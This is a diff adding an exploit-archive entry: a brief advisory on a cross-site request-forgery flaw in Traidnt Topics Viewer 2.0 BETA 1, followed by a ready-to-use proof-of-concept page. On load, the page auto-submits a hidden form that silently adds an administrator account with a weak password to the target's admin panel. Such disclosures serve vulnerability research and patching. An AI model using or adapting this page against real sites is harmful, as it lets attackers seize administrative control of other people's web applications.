@@ -1,0 +1,18 @@
+source:  http://www.securityfocus.com/bid/52224/info
+
+Traidnt Topics Viewer is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain administrative actions, gain unauthorized access to the affected application, or delete certain data. Other attacks are also possible.
+
+Traidnt Topics Viewer 2.0 BETA 1 is vulnerable; other versions may also be affected. 
+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<p>by:thegreenhornet</p>
+<form method="POST" name="form0" action="
+http://www.example.com/top/admincp/main.php?op=add-admin">
+<input type="hidden" name="u_name" value="admin2"/>
+<input type="hidden" name="u_m_pass" value="123456"/>
+<input type="hidden" name="u_email" value="WW22@rwoot.com"/>
+</form>
+</body>
